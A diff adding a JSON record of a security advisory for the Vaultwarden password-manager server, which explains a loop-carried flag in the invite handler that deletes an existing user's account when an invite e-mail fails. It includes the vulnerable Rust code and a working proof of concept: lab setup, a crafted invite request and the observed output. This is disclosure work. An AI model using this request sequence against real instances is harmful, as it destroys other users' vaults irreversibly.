@@ -1,0 +1,48 @@
+{
+  "global": null,
+  "id": "GHSA-v576-3wvq-xh3c",
+  "repo": {
+    "cve_id": null,
+    "cvss_severities": {
+      "cvss_v3": {
+        "score": 6.8,
+        "vector_string": "CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:U/C:N/I:H/A:H"
+      },
+      "cvss_v4": {
+        "score": null,
+        "vector_string": null
+      }
+    },
+    "cwe_ids": [
+      "CWE-459",
+      "CWE-670",
+      "CWE-863"
+    ],
+    "description": "### Summary\r\n\r\nIn `send_invite`, the `user_created` flag is declared **outside** the per-e-mail loop and is never reset. Once any iteration creates a shell account for a new address, the flag stays `true` for every later iteration.\r\n\r\nIf a later iteration resolves to a **pre-existing account** and that invite e-mail fails to send, the error handler takes the `user_created` branch and calls `user.delete()` on **that pre-existing user** - destroying their entire account: all ciphers, folders, attachments, Sends, devices, 2FA registrations, emergency-access grants and organization memberships. There is no transaction, so the deletion persists even though the request returns `500`/`400`.\r\n\r\nAn authenticated attacker can trigger this deliberately (organization creation is open by default, so any registered user can become an Owner of their own organization and invite arbitrary addresses). It also fires **accidentally**: an administrator inviting `[new user, existing user]` whose second message is rejected by the mail relay - greylisting, rate limiting, a full mailbox, a size limit - silently destroys the existing user's vault.\r\n\r\nVerified end-to-end against a stock `vaultwarden/server:1.37.1` container.\r\n\r\n### Details\r\n\r\n`src/api/core/organizations.rs`:\r\n\r\n```rust\r\nlet mut user_created: bool = false;                       // :1078 - OUTSIDE the loop\r\nfor email in &data.emails {                               // :1079\r\n    let user = match User::find_by_mail(email, &conn).await {\r\n        None => {                                         // address has no account\r\n            ...\r\n            let mut new_user = User::new(email, None);\r\n            new_user.save(&conn).await?;\r\n            user_created = true;                          // :1097 - set, never reset\r\n            new_user\r\n        }\r\n        Some(user) => {                                   // :1100 - a PRE-EXISTING account\r\n            if Membership::find_by_user_and_org(...).is_some() {\r\n                err!(format!(\"User already in organization: {email}\"))\r\n            }\r\n            ...\r\n            user\r\n        }\r\n    };\r\n    ...\r\n    if CONFIG.mail_enabled() {\r\n        ...\r\n        if let Err(e) = mail::send_invite(&user, ...).await {\r\n            // Upon error delete the user, invite and org member records when needed\r\n            if user_created {                             // :1140 - still true from an earlier iteration\r\n                user.delete(&conn).await?;                // :1141 - deletes THIS iteration's user\r\n            } else {\r\n                new_member.delete(&conn).await?;          // the correct action\r\n            }\r\n            err!(format!(\"Error sending invite: {e:?} \"));\r\n        }\r\n    }\r\n```\r\n\r\nThe intent of `:1140-1144` is clearly \"if I just created this shell account, roll it back; otherwise only remove the membership\". Because the flag is loop-carried rather than per-iteration, the rollback is applied to a user the handler did **not** create.\r\n\r\n`User::delete` (`src/db/models/user.rs:341-366`) removes Sends, emergency-access grants (both as grantor and by grantee e-mail), every membership, every cipher, favorites, folders, devices, 2FA registrations, and finally the `users` row. The handler runs no transaction (Vaultwarden does not wrap these handlers), so the deletion is committed before the error response is produced.\r\n\r\n`mail::send_invite` returns `Err` for both transient and permanent relay responses (`src/mail.rs`), so any 4xx or 5xx from the MTA - greylisting, rate limit, mailbox full, message too big, sendmail non-zero exit - reaches this branch.\r\n\r\n### PoC\r\n\r\nStock 1.37.1 with SMTP configured. For a deterministic lab, point `SMTP_HOST` at a small sink that answers `250` for every recipient **except** the victim's address (this models a bouncing/greylisted victim mailbox):\r\n\r\n```\r\ndocker run -d --name vw -p 127.0.0.1:8091:80 \\\r\n  -e SIGNUPS_ALLOWED=true \\\r\n  -e SMTP_HOST=<sink-ip> -e SMTP_PORT=2526 -e SMTP_SECURITY=off \\\r\n  -e SMTP_FROM=vault@lab.local -e DOMAIN=http://localhost:8091 \\\r\n  vaultwarden/server:1.37.1\r\n```\r\n\r\n1. Register the victim `victim@corp.test`, log in, create a few items and a folder.\r\n   Baseline: `GET /api/sync` → `ciphers=3, folders=1`.\r\n2. Register the attacker `attacker@evil.test` and log in.\r\n3. Attacker self-grants Owner by creating an organization (open by default):\r\n   `POST /api/organizations {\"name\":\"EvilOrg\",\"billingEmail\":\"attacker@evil.test\",\"collectionName\":\"2.a|b|c\",\"key\":\"2.a|b|c\",\"planType\":0}`.\r\n4. **One request** - a fresh address first (to latch `user_created`), the victim second:\r\n\r\n```\r\nPOST /api/organizations/<org>/users/invite\r\nAuthorization: Bearer <attacker token>\r\nContent-Type: application/json\r\n\r\n{\"emails\":[\"brandnew@evil.test\",\"victim@corp.test\"],\r\n \"groups\":[],\"type\":2,\"collections\":[],\"permissions\":{}}\r\n```\r\n\r\nObserved:\r\n\r\n```\r\nSMTP sink:  -> brandnew@evil.test    250 accepted      (shell account created, user_created = true)\r\nSMTP sink:  -> victim@corp.test      552 rejected      (pre-existing account, mail fails)\r\n\r\nHTTP 400  {\"message\":\"Error sending invite: SMTP 5xx error: permanent error (552) ...\"}\r\n```\r\n\r\nAftermath:\r\n\r\n```\r\nPOST /identity/connect/token  (victim, correct password)\r\n  -> 400  \"Username or password is incorrect. Try again\"\r\n\r\nPOST /identity/accounts/prelogin {\"email\":\"victim@corp.test\"}\r\n  -> kdfIterations 600000      (the default returned for a non-existent account)\r\n```\r\n\r\nThe victim's account and their entire vault are gone. The attacker never interacted with the victim, never needed their password, and never joined any organization.\r\n\r\n### Impact\r\n\r\n* **Destruction of an arbitrary user's account and vault** by any authenticated user of the instance. For a password manager this is catastrophic and irreversible without a backup: ciphers, attachments, folders, Sends, devices, 2FA enrolments and organization memberships are all removed.\r\n* The attacker needs only: a registered account (self-service by default), an organization they created themselves, and one invite e-mail that fails for the victim's address. Any relay-side rejection suffices; the attacker can also influence message size, since the organization name is re-read inside the loop and can be changed between iterations.\r\n* **It also fires accidentally.** A legitimate administrator inviting a mixed batch - one new address and one existing user - loses the existing user's vault whenever the second message is greylisted, rate limited, or bounced. There is no warning, no audit event, and the API returns only a generic \"Error sending invite\".\r\n* Integrity and availability of another user's data; no confidentiality impact (the data is destroyed, not read).\r\n\r\n### Severity\r\n\r\nSuggested **CVSS 3.1 `AV:N/AC:H/PR:L/UI:N/S:U/C:N/I:H/A:H` = 6.8 (Medium)**.\r\n\r\n`AC:H` reflects that the attacker must induce a mail failure for the victim's address. A case can be made for `AC:L` (8.1), because relay rejections are common and the attacker has levers over message size; we have scored it conservatively.\r\n\r\n* **CWE-670** Always-Incorrect Control Flow Implementation\r\n* **CWE-459** Incomplete Cleanup\r\n* **CWE-863** Incorrect Authorization (the deletion path is reached for a user the caller has no authority over)\r\n\r\n### Suggested remediation\r\n\r\nMove the flag inside the loop so it describes only the current iteration:\r\n\r\n```rust\r\nfor email in &data.emails {\r\n    let mut user_created = false;      // per-iteration\r\n    ...\r\n}\r\n```\r\n\r\nAdditionally, consider:\r\n\r\n* binding the rollback to the object rather than a flag (e.g. keep the created `User` in an `Option` and delete only that value);\r\n* wrapping the invite loop in a transaction so a failed send cannot leave partial destructive effects committed;\r\n* never calling `User::delete` on an account the request did not create - a failed invite should at most remove the membership row.\r\n\r\n---",
+    "ghsa_id": "GHSA-v576-3wvq-xh3c",
+    "html_url": "https://github.com/dani-garcia/vaultwarden/security/advisories/GHSA-v576-3wvq-xh3c",
+    "identifiers": [
+      {
+        "type": "GHSA",
+        "value": "GHSA-v576-3wvq-xh3c"
+      }
+    ],
+    "published_at": "2026-10-28T18:01:07Z",
+    "references": [],
+    "severity": "medium",
+    "summary": "Loop-carried user_created flag in send_invite deletes a pre-existing user's account and entire vault when an invite e-mail fails",
+    "updated_at": "2026-10-28T18:01:07Z",
+    "vulnerabilities": [
+      {
+        "package": {
+          "ecosystem": "rust",
+          "name": "vaultwarden"
+        },
+        "patched_versions": "1.37.4",
+        "vulnerable_version_range": ">= 1.33.0, <= 1.37.3"
+      }
+    ],
+    "withdrawn_at": null
+  },
+  "repository": "dani-garcia/vaultwarden"
+}
